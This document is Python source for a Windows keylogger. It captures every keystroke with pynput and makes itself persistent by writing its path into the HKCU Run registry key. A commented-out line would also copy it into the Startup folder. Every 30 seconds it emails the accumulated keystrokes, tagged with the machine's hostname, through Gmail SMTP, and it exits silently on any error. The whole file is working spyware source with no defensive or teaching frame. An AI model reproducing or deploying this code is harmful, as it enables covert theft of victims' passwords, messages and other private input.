import pynput.keyboard
import threading
import smtplib
import socket
import os
import shutil
import sys
import subprocess
from winreg import *
import win32event
import win32api
import winerror
import win32console
import win32gui
email="YOUR MAIL ID"
password="PASSWORD"
server = smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
server.login(email,password)
class Keylogger:

    def __init__(self,time_interval, email, password):
        self.addStartup()
        self.log = socket.gethostname()
        self.interval = time_interval
        self.email = email
        self.password = password

    def addStartup(self):
        if getattr(sys, 'frozen', False):
	           fp = os.path.dirname(os.path.realpath(sys.executable))
        elif __file__:
	           fp = os.path.dirname(os.path.realpath(__file__))
        file_name=sys.argv[0].split("\\")[-1]
        new_file_path= fp+ "\\"+file_name
        #evilfileloc=os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        #shutil.copy(sys.executable,evilfileloc)
        keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

        key2change= OpenKey(HKEY_CURRENT_USER,
        keyVal,0,KEY_ALL_ACCESS)

        SetValueEx(key2change, "logger",0,REG_SZ,new_file_path )



    def append_to_log(self, string):
        self.log = self.log + string
    ##def delete_to_log(self, string2):
        #self.log = self.log - string2
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:


            if key == key.space:
                current_key = " "
            elif key== key.enter:

                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        #    if key==key.backspace:
            #    current_key = "\b"
            #    self.delete_to_log(current_key)
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):

        
        server.sendmail(email,email,message)
        #server.quit()



    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
if __name__ == '__main__':
    try:
        my_keylogger = Keylogger(30,email,password)
        my_keylogger.start()
    except Exception:
        sys.exit()
